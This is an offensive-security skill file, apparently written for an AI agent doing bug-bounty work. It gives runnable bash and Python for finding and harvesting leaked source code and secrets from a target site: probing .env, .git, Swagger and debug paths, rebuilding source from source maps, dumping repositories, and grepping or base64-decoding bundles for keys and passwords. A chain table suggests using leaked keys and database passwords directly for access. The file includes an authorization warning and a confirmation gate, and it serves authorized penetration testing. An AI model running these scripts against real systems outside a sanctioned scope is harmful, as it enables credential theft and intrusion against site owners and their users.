---
name: hunt-source-leak
description: Hunt source code and build artifact leakage
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public, offensive_research
report_count: 7
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# HUNT-SOURCE-LEAK — Source Code & Build Artifact Leakage

## Crown Jewel Targets

Source map exposing TypeScript source = see all API routes, auth logic, secrets. Swagger/OpenAPI JSON = complete API surface map.

**Highest-value findings:**
- **`.js.map` source maps** — reconstruct full TypeScript/ES6 source code → find hardcoded API keys, internal endpoints, auth logic bypasses
- **`swagger.json` / `openapi.json`** — complete REST API specification with all endpoints, parameters, auth schemes, and internal route names
- **`.env` / `.env.production`** — APP_KEY, DB_PASSWORD, API_KEY, SECRET_KEY in plaintext
- **`.git/` exposure** — `git clone` the entire source history → all past hardcoded secrets
- **`asset-manifest.json` / `_next/static/`** — all JS bundle paths → systematic source map discovery
- **`build-info` / `info.json`** — git commit hash, build timestamp, dependency versions → CVE targeting

---

## Phase 1 — Quick Wins (Run First)

```bash
# These 10 requests take <30 seconds and often yield Critical findings
for PATH in \
  "/.env" \
  "/.env.production" \
  "/.env.local" \
  "/.git/HEAD" \
  "/swagger.json" \
  "/api/swagger.json" \
  "/v1/swagger.json" \
  "/openapi.json" \
  "/api/openapi.json" \
  "/api-docs"; do
  STATUS=$(curl -s -o /tmp/sl_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] HIT: https://$TARGET$PATH"
    head -5 /tmp/sl_test
    echo "---"
  fi
done
```

---

## Phase 2 — Source Map Discovery

> **Always resolve the CURRENT build hash before testing, and again before
> re-verifying.** Bundle filenames are content-hashed, so they rotate on every
> deploy. A `.map` URL recorded yesterday can 404 today while the map is still
> fully exposed under a new name. **A 404 at the old URL is not remediation** —
> it is a new build.
>
> ```bash
> # ALWAYS derive the hash live, never reuse a recorded URL
> HASH=$(curl -s "https://$TARGET/" | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
> curl -s -o /dev/null -w '%{http_code} %{size_download} %{content_type}\n' \
>   "https://$TARGET/static/js/${HASH}.map"
> ```
>
> **Lesson from an authorized engagement.** A large production map was found at
> `main.<hashA>.js.map`. On re-verification that URL returned a small HTML
> soft-404 and the finding was nearly closed as fixed. The bundle had rotated to
> `main.<hashB>.js` — and the map was still published at `main.<hashB>.js.map`,
> same size. Nothing had been remediated.
>
> Tell the client this explicitly in the report: **redeploying does not fix source
> map exposure.** Only `GENERATE_SOURCEMAP=false` (or stripping `.map` at deploy)
> plus a CDN purge closes it. A team that redeploys and re-checks the old link
> will wrongly declare victory.
>
> Same rule applies to any content-hashed artifact: chunk files, CSS maps,
> `asset-manifest.json`, and staging equivalents.

```bash
# Step 1: Get asset manifest to find all JS bundle paths
curl -s "https://$TARGET/asset-manifest.json" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/static/js/main.*.js" 2>/dev/null | head -3

# Next.js
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
curl -s "https://$TARGET/_next/static/$BUILD_ID/_buildManifest.js" | head -5

# Step 2: For each JS bundle, check for source map reference at end of file
for JS_URL in $(curl -s https://$TARGET/ | grep -oP 'src="[^"]*\.js"' | sed 's/src="//;s/"//'); do
  LAST_LINE=$(curl -s "https://$TARGET$JS_URL" | tail -1)
  echo "$LAST_LINE" | grep -q "sourceMappingURL" && echo "[+] Source map: $JS_URL"
done

# Step 3: Download and reconstruct source from .map files
JS_URL="https://$TARGET/static/js/main.abc123.js"
MAP_URL="${JS_URL}.map"
curl -s "$MAP_URL" | python3 -c "
import sys, json, os
data = json.load(sys.stdin)
sources = data.get('sources', [])
contents = data.get('sourcesContent', [])
for i, (src, content) in enumerate(zip(sources, contents)):
    if content:
        path = '/tmp/sourcemap_extract/' + src.replace('../','').replace('./',''). replace('webpack://','')
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            f.write(content)
        print(f'[+] Extracted: {src}')
"

# Step 4: Grep extracted source for secrets
grep -r "API_KEY\|SECRET\|PASSWORD\|TOKEN\|PRIVATE" /tmp/sourcemap_extract/ 2>/dev/null
grep -r "process\.env\." /tmp/sourcemap_extract/ 2>/dev/null | grep -v "NEXT_PUBLIC_" | head -20
grep -r "http://internal\|localhost\|127\.0\.0\.1\|10\.\|172\.\|192\.168" /tmp/sourcemap_extract/ 2>/dev/null | head -20
```

---

## Phase 3 — Swagger / OpenAPI Discovery

```bash
# Common paths
SWAGGER_PATHS=(
  "/swagger.json" "/swagger.yaml" "/swagger/"
  "/api/swagger.json" "/api/swagger.yaml"
  "/v1/swagger.json" "/v2/swagger.json" "/v3/swagger.json"
  "/openapi.json" "/openapi.yaml"
  "/api/openapi.json" "/api-docs" "/api-docs.json"
  "/api/v1/swagger.json" "/api/v2/swagger.json"
  "/rest/swagger.json" "/rest/api-docs"
  "/.well-known/openapi.json"
  "/graphql/schema.json"
)

for PATH in "${SWAGGER_PATHS[@]}"; do
  STATUS=$(curl -s -o /tmp/swagger_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] Found: https://$TARGET$PATH"
    # Extract all API paths from swagger
    python3 -c "
import sys, json
try:
    d = json.load(open('/tmp/swagger_test'))
    paths = list(d.get('paths', {}).keys())
    print(f'Endpoints: {len(paths)}')
    print('\n'.join(sorted(paths)))
except: pass
" | head -50
  fi
done
```

---

## Phase 4 — .git Exposure

```bash
# Check if .git directory is accessible
curl -s "https://$TARGET/.git/HEAD" | grep -q "ref:" && echo "[+] .git exposed!"

# If exposed, reconstruct repo
# Tool: git-dumper
pip3 install git-dumper
git-dumper "https://$TARGET/.git/" /tmp/dumped-repo/

# Grep for secrets in all git history
cd /tmp/dumped-repo && \
  git log --all --oneline 2>/dev/null | head -20
  git grep -i "password\|secret\|api_key\|token" $(git rev-list --all) 2>/dev/null | head -30

# trufflehog on git history
trufflehog git file:///tmp/dumped-repo/ 2>/dev/null | head -50
```

---

## Phase 5 — Forgotten Files & Debug Endpoints

```bash
# Build artifacts and debug files
DEBUG_PATHS=(
  "/build-info.json" "/build/build-info.json"
  "/info" "/actuator/info" "/api/info"
  "/version" "/api/version" "/_version"
  "/health" "/status" "/ping"
  "/robots.txt" "/security.txt" "/.well-known/security.txt"
  "/sitemap.xml" "/manifest.json" "/browserconfig.xml"
  "/crossdomain.xml" "/clientaccesspolicy.xml"
  "/phpinfo.php" "/info.php" "/test.php"
  "/server-status" "/server-info" "/.htaccess"
  "/web.config" "/applicationHost.config"
  "/WEB-INF/web.xml" "/META-INF/MANIFEST.MF"
  "/package.json" "/composer.json" "/Gemfile"
  "/Dockerfile" "/docker-compose.yml" "/.dockerenv"
)

for PATH in "${DEBUG_PATHS[@]}"; do
  STATUS=$(curl -s -o /tmp/debug_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] Found: https://$TARGET$PATH ($STATUS, $(wc -c < /tmp/debug_test) bytes)"
    head -3 /tmp/debug_test
    echo "---"
  fi
done
```

---

## Phase 6 — .DS_Store File Listing

```bash
# .DS_Store files on macOS-deployed web servers reveal directory structure
curl -s "https://$TARGET/.DS_Store" | xxd | head -10

# Parse .DS_Store to extract filenames
pip3 install ds_store
python3 -c "
from ds_store import DSStore
with DSStore.open('/tmp/ds_store_test', 'r') as d:
    for entry in d:
        print(entry.filename)
"

# Recursive .DS_Store enumeration
# Tool: https://github.com/lijiejie/ds_store_exp
python3 ds_store_exp.py "https://$TARGET/"
```

---

## Phase 7 — webpack Chunk Analysis

```bash
# Download and analyze webpack chunks for hardcoded values
# Find chunk files
curl -s https://$TARGET/ | grep -oP '"[^"]*\.chunk\.js"' | tr -d '"' | while read chunk; do
  echo "Analyzing: $chunk"
  curl -s "https://$TARGET$chunk" | \
    grep -oE '"(api_key|apiKey|secret|password|token|key)"\s*:\s*"[^"]+"' | head -5
done

# Also grep for internal hostnames
curl -s "https://$TARGET/static/js/main.*.js" | \
  grep -oE '"(https?://[^"]*internal[^"]*|http://[^"]*localhost[^"]*)"' | sort -u

# Check for Base64-encoded secrets
curl -s "https://$TARGET/static/js/main.*.js" | \
  grep -oP '"[A-Za-z0-9+/]{30,}={0,2}"' | while read b64; do
  DECODED=$(echo "$b64" | tr -d '"' | base64 -d 2>/dev/null)
  echo "$DECODED" | grep -iE "key|secret|password|token" && echo "  B64: $b64"
done
```

---

## Chain Table

| Source leak finding | Chain to | Impact |
|--------------------|----------|--------|
| Source map with API key | Use key directly → API access | High/Critical |
| Source map with auth logic | Find auth bypass route | Critical |
| Swagger → internal endpoints | Test undocumented admin routes | High |
| .git exposed | Full source history → all past secrets | Critical |
| build-info with git hash | CVE targeting exact version | High |
| .env with DB_PASSWORD | Direct database access | Critical |

---

## Tools

```bash
# git-dumper (reconstruct exposed .git)
pip3 install git-dumper
git-dumper "https://target.com/.git/" /tmp/repo/

# sourcemap-explorer (visualize what's in bundles)
npm install -g source-map-explorer
source-map-explorer main.js

# unwebpack-sourcemap (extract all source files)
npm install -g unwebpack-sourcemap

# trufflehog (secret scanning)
trufflehog filesystem /tmp/repo/
```

---

## Validation

✅ Source map: reconstructed TypeScript source contains API endpoints or hardcoded secrets
✅ Swagger: JSON contains internal endpoints not visible in UI
✅ .git exposed: git-dumper successfully clones repo, secrets in history
✅ .env exposed: DATABASE_URL, API_KEY, SECRET_KEY visible in plaintext

**Severity:**
- .env with credentials: Critical
- .git with secrets in history: Critical
- Source map with secrets: High
- Swagger with internal routes: Medium-High
- robots.txt only: Informational

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
